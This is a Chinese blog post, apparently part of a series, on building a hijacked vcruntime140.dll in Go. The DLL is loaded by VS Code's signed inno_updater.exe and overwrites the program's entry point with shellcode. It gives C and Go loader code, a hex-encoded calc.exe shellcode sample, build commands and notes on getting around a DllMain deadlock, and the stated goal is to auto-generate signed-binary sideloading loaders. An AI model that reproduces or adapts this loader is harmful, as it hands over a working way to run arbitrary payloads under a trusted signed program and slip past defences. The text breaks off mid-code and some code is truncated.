用Golang编写 dll劫持的一些坑 (3)
源于知识星球的一个想法，利用一些已知的dll劫持的程序作为"模板",自动生成白加黑的程序。
我想用Golang编写劫持的dll，这样也方便可以做成在线平台。
我们的目标不是让它弹一个信息框，而是让它执行shellcode，并且使用一些hook技术保证白程序只加
载一个dll的同时不和后续的代码冲突  这需要我们编写一个通用的dll白加黑的劫持模板，当然dll加载模
式不同劫持的方式也不同。
我找到是vscode它的更新程序，也有它官方的签名
被劫持的dll在 inno_updater.exe 的导入表中，这种劫持可以叫它 pre-load ，我只用实现它的5个函数
就可以了。
因为我想做成通用型的，对于这种输入表导入的dll做劫持，只需要在 DllMain 中获取主程序的入口点，
然后将shellcode写入入口点，之后主程序运行就会执行我们的shellcode了。
C代码如下
测试过是能够正常使用的。
但是把它转成Go的过程中，踩了不少坑。
C代码转换为Go
int WINAPI DllMain(HINSTANCE hInstance, DWORD fdwReason, PVOID pvReserved)
{
        switch (fdwReason)
        {
        case DLL_PROCESS_ATTACH:
            hello_func();
            break;
        case DLL_PROCESS_DETACH:
            break; 
        }
        return TRUE;
}
void hello_func()｛
    DWORD baseAddress = (DWORD)GetModuleHandleA(NULL);
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)baseAddress;
    PIMAGE_NT_HEADERS32 ntHeader = (PIMAGE_NT_HEADERS32)(baseAddress + 
dosHeader->e_lfanew);
    DWORD entryPoint = (DWORD)baseAddress + ntHeader-
>OptionalHeader.AddressOfEntryPoint;
    DWORD old;
    VirtualProtect(entryPoint, size, 0x40, &old);
    for(int i=0;i
extern void test();
BOOL WINAPI DllMain(
    HINSTANCE _hinstDLL,  // handle to DLL module
    DWORD _fdwReason,     // reason for calling function
    LPVOID _lpReserved)   // reserved
{
    switch (_fdwReason) {
    case DLL_PROCESS_ATTACH:
        MessageBox(0,0,0,0);
        CreateThread(NULL, 0, test, NULL, 0, NULL);
        break;
    case DLL_PROCESS_DETACH:
        // Perform any necessary cleanup.
        break;
    case DLL_THREAD_DETACH:
        // Do thread-specific cleanup.
        break;
    case DLL_THREAD_ATTACH:
        // Do thread-specific initialization.
        break;
    }
    return TRUE; // Successful.
}
package main
import "C"
import (
    "encoding/hex"
    "fmt"
    "strconv"
    "syscall"
    "unsafe"
)
const (
    MEM_COMMIT     = 0x00001000
    MEM_RESERVE    = 0x00002000
    MEM_RELEASE    = 0x8000
    PAGE_READWRITE = 0x04
)
var (
    kernel32           = syscall.NewLazyDLL("kernel32.dll")
    getModuleHandle    = kernel32.NewProc("GetModuleHandleW")
    procVirtualProtect = kernel32.NewProc("VirtualProtect")
)
//WriteMemory writes the provided memory to the specified memory address. Does 
**not** check permissions, may cause panic if memory is not writable etc.
func WriteMemory(inbuf []byte, destination uintptr) {
    for index := uint32(0); index  0
}
// 将shellcode写入程序ep
func loader_from_ep(shellcode []byte) {
    baseAddress := GetModuleHandle()
    ptr := unsafe.Pointer(baseAddress + uintptr(0x3c))
    v := (*uint32)(ptr)
    ntHeaderOffset := *v
    ptr = unsafe.Pointer(baseAddress + uintptr(ntHeaderOffset) + uintptr(40))
编译脚本 (Windows上)
    ep := (*uint32)(ptr)
    var entryPoint uintptr
    entryPoint = baseAddress + uintptr(*ep)
    var oldfperms uint32
    if !VirtualProtect(unsafe.Pointer(entryPoint), 
unsafe.Sizeof(uintptr(len(shellcode))), uint32(0x40), 
unsafe.Pointer(&oldfperms)) {
        panic("Call to VirtualProtect failed!")
    }
    WriteMemory(shellcode, entryPoint)
    if !VirtualProtect(unsafe.Pointer(entryPoint), uintptr(len(shellcode)), 
uint32(oldfperms), unsafe.Pointer(&oldfperms)) {
        panic("Call to VirtualProtect failed!")
    }
}
//export _except_handler4_common
func _except_handler4_common() {}
//export memcmp
func memcmp() {}
//export memcpy
func memcpy() {}
//export memset
func memset() {}
//export memmove
func memmove() {}
//export test
func test() {
    shellcode, err := 
hex.DecodeString("fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac
3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a
498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01
d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6a018d85b20000005068318b6f87
ffd5bbf0b5a25668a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd563616c6300") 
// calc的shellcode
    if err != nil {
        panic(err)
    }
    loader_from_ep(shellcode)
}
func main() {
}
set GOOS=windows
set GOARCH=386
set CGO_ENABLED=1
go build -ldflags "-s -w" -o vcruntime140.dll -buildmode=c-shared
坑点
dllmain.h的DllMain
在DllMain DLL_PROCESS_ATTACH的时候，我想调用go里面的 test 函数，我必须使用线程。。如果直
接调用，不使用线程的话，它会一直卡住，用od调试，发现它卡在了死锁上。。
用了CreateThread可以，它会把入口点写入shellcode，但是这个时候它是先执行了入口，再写入的
shellcode，虽然函数运行成功，但是没有意义了。
这就是我遇到的坑点。。
虽然可以用C写，Go调用，但这样我用Go的意义就不在了呀。。
改写入口点
直接把入口点写个死循环，然后调用Go的代码，不就绕过了这个限制。
死循环的代码就随便发挥了
dllmain.h
BOOL WINAPI DllMain(
    HINSTANCE _hinstDLL,  // handle to DLL module
    DWORD _fdwReason,     // reason for calling function
    LPVOID _lpReserved)   // reserved
{